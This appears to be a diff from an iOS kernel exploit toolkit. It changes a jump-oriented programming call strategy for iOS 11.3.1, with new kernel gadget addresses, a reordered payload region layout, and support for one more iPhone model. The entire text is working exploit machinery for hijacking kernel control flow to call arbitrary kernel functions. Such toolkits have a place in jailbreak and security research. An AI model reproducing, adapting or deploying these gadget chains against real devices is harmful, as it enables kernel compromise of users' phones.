@@ -11,15 +11,15 @@
  *  	kernel_call_2
  *  		REGION_0 = {
  *  			  0: REGION_1
- *  			  8: GADGET_CALL_FUNCTION_1
- *  			 10: FUNCTION
+ *  			  8: FUNCTION
+ *  			 10: ARGUMENT_0
  *  			 18
  *  			 20: REGION_ARGUMENTS_2_TO_8
  *  			 28: ARGUMENT_1
  *  			 30: GADGET_POPULATE_3
  *  			 38
  *  			 40
- *  			 48: ARGUMENT_0
+ *  			 48: GADGET_CALL_FUNCTION_1
  *  			 c0: JOP_STACK_2
  *  			268: REGION_2
  *  			288: <-RESULT
@@ -51,11 +51,12 @@
  *  			GADGET_POPULATE_3
  *  		]
  *  		JOP_STACK_2 = [
- *  			MOV_X19_X10__BR_X8
+ *  			MOV_X19_X4__BR_X8
  *  			MOV_X20_X7__BR_X8
  *  			MOV_X23_X6__BLR_X8
- *  			MOV_X24_X4__BLR_X8
- *  			MOV_X8_X3__BR_X9
+ *  			MOV_X0_X3__BLR_X8
+ *  			MOV_X24_X0__BLR_X8
+ *  			MOV_X8_X10__BR_X9
  *  		]
  *  		x0 = REGION_0
  *  		x1 = JOP_STACK_1
@@ -154,13 +155,13 @@
  *  		mov x1, x20
  *  		blr x8
  *  	x2 = REGION_0[0]
- *  	x3 = REGION_0[0x8] = GADGET_CALL_FUNCTION_1
- *  	x4 = REGION_0[0x10] = FUNCTION
+ *  	x3 = REGION_0[0x8] = FUNCTION
+ *  	x4 = REGION_0[0x10] = ARGUMENT_0
  *  	x5 = REGION_0[0x18]
  *  	x6 = REGION_0[0x20] = REGION_ARGUMENTS_2_TO_8
  *  	x7 = REGION_0[0x28] = ARGUMENT_1
  *  	x9 = REGION_0[0x30] = GADGET_POPULATE_3
- *  	x10 = REGION_0[0x48] = ARGUMENT_0
+ *  	x10 = REGION_0[0x48] = GADGET_CALL_FUNCTION_1
  *  	x0 = REGION_0
  *  	x1 = JOP_STACK_2
  *  	pc = JOP_DISPATCH
@@ -174,8 +175,8 @@
  *  ;; 	x8 = GADGET_CALL_FUNCTION_1
  *  ;; 	pc = GADGET_POPULATE_3
  *
- *  MOV_X19_X10__BR_X8 (0xfffffff00663d430):
- *  		mov x19, x10
+ *  MOV_X19_X4__BR_X8 (0xfffffff006648eb4):
+ *  		mov x19, x4
  *  		br x8
  *  	x19 = ARGUMENT_0
  *  	pc = JOP_DISPATCH
@@ -192,14 +193,20 @@
  *  	x23 = REGION_ARGUMENTS_2_TO_8
  *  	pc = JOP_DISPATCH
  *
- *  MOV_X24_X4__BLR_X8 (0xfffffff0066eb718):
- *  		mov x24, x4
+ *  MOV_X0_X3__BLR_X8 (0xfffffff0060f0150):
+ *  		mov x0, x3
+ *  		blr x8
+ *  	x0 = FUNCTION
+ *  	pc = JOP_DISPATCH
+ *
+ *  MOV_X24_X0__BLR_X8 (0xfffffff0061b0288):
+ *  		mov x24, x0
  *  		blr x8
  *  	x24 = FUNCTION
  *  	pc = JOP_DISPATCH
  *
- *  MOV_X8_X3__BR_X9 (0xfffffff006745e3c):
- *  		mov x8, x3
+ *  MOV_X8_X10__BR_X9 (0xfffffff006625318):
+ *  		mov x8, x10
  *  		br x9
  *  	x8 = GADGET_CALL_FUNCTION_1
  *  	pc = GADGET_POPULATE_3
@@ -327,11 +334,12 @@ check() {
 	NEED(GADGET_INITIALIZE_X20_1);
 	NEED(MOV_X25_X19__BR_X8);
 	NEED(GADGET_POPULATE_3);
-	NEED(MOV_X19_X10__BR_X8);
+	NEED(MOV_X19_X4__BR_X8);
 	NEED(MOV_X20_X7__BR_X8);
 	NEED(MOV_X23_X6__BLR_X8);
-	NEED(MOV_X24_X4__BLR_X8);
-	NEED(MOV_X8_X3__BR_X9);
+	NEED(MOV_X0_X3__BLR_X8);
+	NEED(MOV_X24_X0__BLR_X8);
+	NEED(MOV_X8_X10__BR_X9);
 	NEED(GADGET_CALL_FUNCTION_1);
 	NEED(GADGET_STORE_RESULT_2);
 	NEED(GADGET_EPILOGUE_2);
@@ -383,12 +391,12 @@ build(uint64_t func, const uint64_t args[14], kaddr_t kernel_payload,
 
 	// Construct the REGION_0 region.
 	*(uint64_t *)(payload_REGION_0 +   0x0) = kernel_REGION_1;
-	*(uint64_t *)(payload_REGION_0 +   0x8) = gadget(GADGET_CALL_FUNCTION_1);
-	*(uint64_t *)(payload_REGION_0 +  0x10) = func;
+	*(uint64_t *)(payload_REGION_0 +   0x8) = func;
+	*(uint64_t *)(payload_REGION_0 +  0x10) = args[0];
 	*(uint64_t *)(payload_REGION_0 +  0x20) = kernel_REGION_ARGUMENTS_2_TO_8;
 	*(uint64_t *)(payload_REGION_0 +  0x28) = args[1];
 	*(uint64_t *)(payload_REGION_0 +  0x30) = gadget(GADGET_POPULATE_3);
-	*(uint64_t *)(payload_REGION_0 +  0x48) = args[0];
+	*(uint64_t *)(payload_REGION_0 +  0x48) = gadget(GADGET_CALL_FUNCTION_1);
 	*(uint64_t *)(payload_REGION_0 +  0xc0) = kernel_JOP_STACK_2;
 	*(uint64_t *)(payload_REGION_0 + 0x268) = kernel_REGION_2;
 
@@ -421,11 +429,12 @@ build(uint64_t func, const uint64_t args[14], kaddr_t kernel_payload,
 		MOV_X25_X19__BR_X8,
 		GADGET_POPULATE_3,
 		// JOP_STACK_2
-		MOV_X19_X10__BR_X8,
+		MOV_X19_X4__BR_X8,
 		MOV_X20_X7__BR_X8,
 		MOV_X23_X6__BLR_X8,
-		MOV_X24_X4__BLR_X8,
-		MOV_X8_X3__BR_X9,
+		MOV_X0_X3__BLR_X8,
+		MOV_X24_X0__BLR_X8,
+		MOV_X8_X10__BR_X9,
 	};
 	struct JOP_DISPATCH_NODE {
 		uint64_t x2;
@@ -459,6 +468,7 @@ build(uint64_t func, const uint64_t args[14], kaddr_t kernel_payload,
  *
  * Platforms:
  * 	iOS 11.3.1 15E302: iPhone10,1
+ * 	iOS 11.3.1 15E302: iPhone6,2
  */
 struct jop_call_strategy jop_call_strategy_6 = {
 	0x300, 0x8, check, build,
